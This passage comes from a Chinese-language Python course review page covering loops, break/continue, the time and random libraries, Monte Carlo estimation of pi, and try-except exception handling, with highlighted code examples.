我国卫生部标准</span></span><br><span class="line">    dom = <span class="string">&quot;偏瘦&quot;</span></span><br><span class="line"><span class="keyword">elif</span> bmi &lt; <span class="number">24</span>:    <span class="comment"># 18.5 &lt;= bmi &lt; 24</span></span><br><span class="line">    dom = <span class="string">&quot;正常&quot;</span></span><br><span class="line"><span class="keyword">elif</span> bmi &lt; <span class="number">28</span>:    <span class="comment"># 24 &lt;= bmi &lt; 28</span></span><br><span class="line">    dom = <span class="string">&quot;偏胖&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    dom = <span class="string">&quot;肥胖&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;BMI指标为:国际&#x27;&#123;0&#125;&#x27;, 国内&#x27;&#123;1&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(wto, dom))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">请输入身高(米)和体重(公斤)[逗号隔开]: <span class="number">1.75</span>, <span class="number">75</span></span><br><span class="line">BMI数值为：<span class="number">24.49</span></span><br><span class="line">BMI指标为:国际<span class="string">&#x27;正常&#x27;</span>, 国内<span class="string">&#x27;偏胖&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="程序的循环结构"><a href="#程序的循环结构" class="headerlink" title="程序的循环结构"></a>程序的循环结构</h2><p>遍历循环（for）、无限循环（while）、循环控制保留字</p>
<h3 id="遍历循环for语句"><a href="#遍历循环for语句" class="headerlink" title="遍历循环for语句"></a>遍历循环for语句</h3><p>遍历循环：循环的次数是确定的，循环语句对循环次数有明确的定义，循环次数采用遍历结构中元素个数来体现</p>
<p>Python通过保留字for实现“遍历循环” ：</p>
<p>for  &lt;循环变量&gt;  in  &lt;遍历结构&gt;:<br>&lt;语句块&gt;</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2063.png" alt="image.png"></p>
<p>*遍历循环的应用</p>
<p>计数循环(N次)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Hello:&quot;</span>,i)</span><br><span class="line">Hello: <span class="number">0</span></span><br><span class="line">Hello: <span class="number">1</span></span><br><span class="line">Hello: <span class="number">2</span></span><br><span class="line">Hello: <span class="number">3</span></span><br><span class="line">Hello: <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>计数循环(特定次)：遍历由range()函数产生的数字序列，产生循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M,N,K) :</span><br><span class="line">     &lt;语句块&gt;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>):</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Hello:&quot;</span>,i)</span><br><span class="line">Hello: <span class="number">1</span></span><br><span class="line">Hello: <span class="number">3</span></span><br><span class="line">Hello: <span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>字符串遍历循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s: </span><br><span class="line">     &lt;语句块&gt;</span><br><span class="line"><span class="comment">#s是字符串，遍历字符串每个字符，产生循环</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;Python123&quot;</span>:</span><br><span class="line">       <span class="built_in">print</span>(c, end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line">P,y,t,h,o,n,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,</span><br></pre></td></tr></table></figure>

<p>列表遍历循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> ls  : </span><br><span class="line">     &lt;语句块&gt;</span><br><span class="line"><span class="comment">#ls是一个列表，遍历其每个元素，产生循环</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> [<span class="number">123</span>, <span class="string">&quot;PY&quot;</span>, <span class="number">456</span>] :</span><br><span class="line">       <span class="built_in">print</span>(item, end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">123</span>,PY,<span class="number">456</span>,</span><br></pre></td></tr></table></figure>

<p>文件遍历循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fi  : </span><br><span class="line">     &lt;语句块&gt;</span><br><span class="line"><span class="comment">#fi是一个文件标识符，遍历其每行，产生循环</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fi :</span><br><span class="line">       <span class="built_in">print</span>(line)</span><br><span class="line">优美胜于丑陋</span><br><span class="line">明了胜于隐晦</span><br><span class="line">简洁胜于复杂</span><br></pre></td></tr></table></figure>

<p>当for循环正常执行之后，程序会继续执行else语句中内容。else语句只在循环正常执行之后才执行并结束，因此，可以在&lt;语句块2&gt;中放置判断循环执行情况的语句。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="string">&quot;BIT&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;循环进行中: &quot;</span> + s)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s = <span class="string">&quot;循环正常结束&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">循环进行中: B</span><br><span class="line">循环进行中: I</span><br><span class="line">循环进行中: T</span><br><span class="line">循环正常结束</span><br></pre></td></tr></table></figure>

<h3 id="无限循环while语句"><a href="#无限循环while语句" class="headerlink" title="无限循环while语句"></a>无限循环while语句</h3><p>无限循环：无限循环一直保持循环操作直到特定循环条件不被满足才结束，不需要提前知道确定循环次数。</p>
<p>Python通过保留字while实现无限循环，使用方法如下：</p>
<p>while  &lt;条件&gt;:<br>&lt;语句块&gt;语句块</p>
<p>无限循环也有一种使用保留字else的扩展模式：</p>
<p>while  &lt;条件&gt;:<br>&lt;语句块1&gt;<br>else:<br>&lt;语句块2&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s, idx = <span class="string">&quot;BIT&quot;</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(s):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;循环进行中: &quot;</span> + s[idx])</span><br><span class="line">    idx += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s = <span class="string">&quot;循环正常结束&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">循环进行中: B</span><br><span class="line">循环进行中: I</span><br><span class="line">循环进行中: T</span><br><span class="line">循环正常结束</span><br></pre></td></tr></table></figure>

<h3 id="循环保留字break和continue"><a href="#循环保留字break和continue" class="headerlink" title="循环保留字break和continue"></a>循环保留字break和continue</h3><p>循环结构有两个辅助保留字：break和continue，它们用来辅助控制循环执行</p>
<p>break用来跳出最内层for或while循环，脱离该循环后程序从循环后代码继续续执行</p>
<p>其中，<strong>break语句跳出了最内层for循环，但仍然继续执行外层循环。每个break语句只有能力跳出当前层次循环</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="string">&quot;BIT&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span>(s, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s==<span class="string">&quot;I&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">BBBBBBBBBBITTTTTTTTTT</span><br></pre></td></tr></table></figure>

<p>continue用来结束当前当次循环，即跳出循环体中<strong>下面尚未执行的语句，但不跳出当前循环。</strong></p>
<p>对于while循环，继续求解循环条件。而对于for循环，程序流程接着遍历循环列表</p>
<p>对比continue和break语句，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="string">&quot;PYTHON&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> s==<span class="string">&quot;T&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(s, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">PYHON</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="string">&quot;PYTHON&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> s==<span class="string">&quot;T&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(s, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">PY</span><br></pre></td></tr></table></figure>

<p>for循环和while循环中都存在一个else扩展用法。</p>
<p>else中的语句块只在一种条件下执行，即for循环正常遍历了所有内容没有因为break或return而退出。</p>
<p>continue保留字对else没有影响。看下面两个例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="string">&quot;PYTHON&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> s==<span class="string">&quot;T&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(s, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正常退出&quot;</span>)</span><br><span class="line">&gt;&gt;&gt;PYHON正常退出</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="string">&quot;PYTHON&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> s==<span class="string">&quot;T&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(s, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正常退出&quot;</span>)</span><br><span class="line">&gt;&gt;&gt;PY</span><br></pre></td></tr></table></figure>

<h2 id="time库基本介绍"><a href="#time库基本介绍" class="headerlink" title="time库基本介绍"></a>time库基本介绍</h2><p>time库是Python中处理时间的标准库：计算机时间的表达、提供获取系统时间并格式化输出功能、提供系统级精确计时功能，用于程序性能分析</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">time.&lt;b&gt;()</span><br></pre></td></tr></table></figure>

<p>time库包括三类函数：</p>
<p>时间获取：time() ctime() gmtime()</p>
<p>时间格式化：strftime() strptime()</p>
<p>程序计时：sleep(), perf_counter()</p>
<h3 id="时间获取"><a href="#时间获取" class="headerlink" title="时间获取"></a>时间获取</h3><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2064.png" alt="image.png"></p>
<h2 id="random库的使用"><a href="#random库的使用" class="headerlink" title="random库的使用"></a>random库的使用</h2><p>随机数在计算机应用中十分常见，Python内置的random库主要用于产生各种分布的伪随机数序列。random库采用梅森旋转算法（Mersenne twister）生成伪随机数序列，可用于除随机性要求更高的加解密算法外的大多数工程应用。</p>
<p>使用random库主要目的是生成随机数，因此，读者只需要查阅该库的随机数生成函数，找到符合使用场景的函数使用即可。这个库提供了不同类型的随机数函数，所有函数都是基于最基本的random.random()函数扩展而来。</p>
<h3 id="random库解析"><a href="#random库解析" class="headerlink" title="random库解析"></a>random库解析</h3><p>生成随机数之前可以通过seed()函数指定随机数种子，<strong>随机种子一般是一个整数，只要种子相同，每次生成的随机数序列也相同。</strong>这种情况便于测试和同步数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;seed(<span class="number">125</span>) <span class="comment"># 随机种子赋值125</span></span><br><span class="line">&gt;&gt;&gt;<span class="string">&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;</span>.<span class="built_in">format</span>(randint(<span class="number">1</span>,<span class="number">10</span>),randint(<span class="number">1</span>,<span class="number">10</span>),randint(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="string">&#x27;4.4.10&#x27;</span></span><br><span class="line">&gt;&gt;&gt;<span class="string">&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;</span>.<span class="built_in">format</span>(randint(<span class="number">1</span>,<span class="number">10</span>),randint(<span class="number">1</span>,<span class="number">10</span>),randint(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="string">&#x27;5.10.3&#x27;</span></span><br><span class="line">&gt;&gt;&gt;seed(<span class="number">125</span>) <span class="comment"># 再次给随机种子赋值125</span></span><br><span class="line">&gt;&gt;&gt;<span class="string">&quot;&#123;&#125;.&#123;&#125;.&#123;&#125;&quot;</span>.<span class="built_in">format</span>(randint(<span class="number">1</span>,<span class="number">10</span>),randint(<span class="number">1</span>,<span class="number">10</span>),randint(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="string">&#x27;4.4.10&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2065.png" alt="image.png"></p>
<h2 id="π的计算"><a href="#π的计算" class="headerlink" title="π的计算"></a>π的计算</h2><p>π（圆周率）是一个无理数，即无限不循环小数。精确求解圆周率π是几何学、物理学和很多工程学科的关键。</p>
<p>对π的精确求解曾经是数学历史上一直难以解决的问题之一，因为π无法用任何精确公式表示，在电子计算机出现以前，π只能通过一些近似公式的求解得到，直到1948年，人类才以人工计算方式得到π的808位精确小数。</p>
<p>随着计算机的出现，数学家找到了另类求解π的另类方法：蒙特卡罗方法，又称随机抽样或统计试验方法。当所要求解的问题是某种事件出现的概率，或者是某个随机变量的期望值时，它们可以通过某种“试验”的方法，得到这种事件出现的频率，或者这个随机变数的平均值，并用它们作为问题的解。这就是蒙特卡罗方法的基本思想。</p>
<p>应用蒙特卡罗方法求解π的基本步骤如下：随机向单位正方形和圆结构，抛洒大量“飞镖”点。计算每个点到圆心的距离从而判断该点在圆内或者圆外。用圆内的点数除以总点数就是π&#x2F;4值。随机点数量越大，越充分覆盖整个图形，计算得到的π值越精确。实际上，这个方法的思想是利用离散点值表示图形的面积，通过面积比例来求解π值。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2066.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e6.1CalPi.py</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> clock</span><br><span class="line">DARTS = <span class="number">10000</span></span><br><span class="line">hits = <span class="number">0.0</span></span><br><span class="line">clock()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(DARTS):</span><br><span class="line">    x, y = random(), random()</span><br><span class="line">    dist = sqrt(x ** <span class="number">2</span> + y ** <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> dist &lt;= <span class="number">1.0</span>:</span><br><span class="line">        hits = hits + <span class="number">1</span></span><br><span class="line">pi = <span class="number">4</span> * (hits/DARTS)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Pi值是&#123;&#125;.&quot;</span>.<span class="built_in">format</span>(pi))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;运行时间是: &#123;:5.5&#125;s&quot;</span>.<span class="built_in">format</span>(clock())) </span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">Pi值是<span class="number">3.144</span></span><br><span class="line">运行时间是: <span class="number">0.016477</span>s</span><br></pre></td></tr></table></figure>

<h2 id="异常处理机制"><a href="#异常处理机制" class="headerlink" title="异常处理机制"></a>异常处理机制</h2><h3 id="异常处理try-except语句"><a href="#异常处理try-except语句" class="headerlink" title="异常处理try-except语句"></a><strong>异常处理try-except语句</strong></h3><p>观察下面这段小程序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num=<span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个整数: &quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(num**<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>当用户输入的不是数字呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; </span><br><span class="line">请输入一个整数: <span class="number">100</span></span><br><span class="line"><span class="number">10000</span></span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">请输入一个整数: No</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;D:/PythonPL/echoInt.py&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个整数: &quot;</span>))</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;No&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<p>Python解释器返回了异常信息，同时程序退出</p>
<p>Python异常信息中最重要的部分是异常类型，它表明了发生异常的原因，也是程序处理异常的依据。</p>
<p>Python使用try-except语句实现异常处理，基本的语法格式如下：</p>
<p>try:<br>&lt;语句块1&gt;<br>except &lt;异常类型&gt;:<br>&lt;语句块2&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个整数: &quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(num**<span class="number">2</span>)</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入错误，请输入一个整数!&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">请输入一个整数: NO</span><br><span class="line">输入错误，请输入一个整数!</span><br></pre></td></tr></table></figure>

<h3 id="异常的高级用法"><a href="#异常的高级用法" class="headerlink" title="异常的高级用法"></a><strong>异常的高级用法</strong></h3><p>try-except语句可以支持多个except语句，语法格式如下：</p>
<p>try:<br>&lt;语句块1&gt;<br>except &lt;异常类型1&gt;:<br>&lt;语句块2&gt;<br>….<br>except &lt;异常类型N&gt;:<br>&lt;语句块N+1&gt;<br>except:<br>&lt;语句块N+2&gt;</p>
<p>注意顺序，从具体到一般</p>
<p>最后一个except语句没有指定任何类型，表示它对应的语句块可以处理所有其他异常。这个过程与if-elif-else语句类似，是分支结构的一种表达方式，一段代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    alp = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">    idx = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个整数: &quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(alp[idx])</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入错误，请输入一个整数!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;其他错误&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>该程序将用户输入的数字作为索引从字符串alp中返回一个字符，当用户输入非整数字符时，except NameError异常被捕获到，提示升用户输入类型错误，当用户输入数字不在0到25之间时，异常被except捕获，程序打印其他错误信息，执行过程和结果如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; </span><br><span class="line">请输入一个整数: NO</span><br><span class="line">输入错误，请输入一个整数!</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">请输入一个整数: <span class="number">100</span></span><br><span class="line">其他错误</span><br></pre></td></tr></table></figure>

<p>除了try和except保留字外，异常语句还可以与else和finally保留字配合使用，语法格式如下：</p>
<p>try:<br>&lt;语句块1&gt;<br>except &lt;异常类型1&gt;:<br>&lt;语句块2&gt;<br>else:<br>&lt;语句块3&gt;<br>finally:<br>&lt;语句块4&gt;</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2067.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#采用else和finally修改代码如下</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    alp = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">    idx = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个整数: &quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(alp[idx])</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入错误，请输入一个整数!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有发生异常&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序执行完毕，不知道是否发生了异常&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行过程和结果如下</span></span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">请输入一个整数: <span class="number">5</span></span><br><span class="line">F</span><br><span class="line">没有发生异常</span><br><span class="line">程序执行完毕，不知道是否发生了异常</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">请输入一个整数: NO</span><br><span class="line">输入错误，请输入一个整数!</span><br><span class="line">程序执行完毕，不知道是否发生了异常</span><br></pre></td></tr></table></figure>

<h2 id="课堂讲解代码"><a href="#课堂讲解代码" class="headerlink" title="课堂讲解代码"></a>课堂讲解代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">5</span>:</span><br><span class="line">             i = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">a=[<span class="number">7</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> index,number <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">    <span class="built_in">print</span>(index,number)</span><br><span class="line"></span><br><span class="line">sample=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;王大锤&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">20</span>,<span class="string">&#x27;school&#x27;</span>:<span class="string">&#x27;清华大学&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sample:</span><br><span class="line">    <span class="built_in">print</span>(i) <span class="comment"># 只打印key</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sample.items():</span><br><span class="line">    <span class="built_in">print</span>(i) <span class="comment"># 打印key和value</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sample.values():</span><br><span class="line">    <span class="built_in">print</span>(i) <span class="comment"># 只打印value</span></span><br><span class="line"></span><br><span class="line">years=[<span class="number">2020</span>,<span class="number">2021</span>,<span class="number">2022</span>,<span class="number">2023</span>,<span class="number">2024</span>,<span class="number">2025</span>]</span><br><span class="line">scores=[<span class="number">600</span>,<span class="number">601</span>,<span class="number">602</span>,<span class="number">603</span>,<span class="number">604</span>,<span class="number">605</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">zip</span>(years,scores):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">sentiment = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">zip</span>(years,scores,sentiment):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># zip()函数可以将多个可迭代对象打包成一个元组的列表，返回一个zip对象</span></span><br><span class="line"></span><br><span class="line">sentiment = [<span class="string">&#x27;kaixin&#x27;</span>,<span class="string">&#x27;shangxin&#x27;</span>,<span class="string">&#x27;kaixin&#x27;</span>,<span class="string">&#x27;shangxin&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">zip</span>(years,scores,sentiment):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">start=time.perf_counter()</span><br><span class="line"><span class="comment"># 列表推导式</span></span><br><span class="line">squares=[x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>)]</span><br><span class="line">squares=<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x**<span class="number">2</span>,[x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>)])</span><br><span class="line"><span class="built_in">print</span>(time.perf_counter()-start)</span><br><span class="line">squares=<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x**<span class="number">2</span>,[x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(squares))</span><br><span class="line"></span><br><span class="line">numbers=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="comment"># 筛选出偶数并平方</span></span><br><span class="line">result=<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x**<span class="number">2</span>,<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:x%<span class="number">2</span>==<span class="number">0</span>,numbers))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(result)) <span class="comment"># [4,16,36]</span></span><br></pre></td></tr></table></figure>

<p>循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s,idx =<span class="string">&quot;BIT&quot;</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(s):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;循环进行中:&quot;</span>+ s[idx])</span><br><span class="line">    idx += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s=<span class="string">&quot;循环正常结束&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">循环进行中:B</span></span><br><span class="line"><span class="string">循环进行中:I</span></span><br><span class="line"><span class="string">循环进行中:T</span></span><br><span class="line"><span class="string">循环正常结束</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span 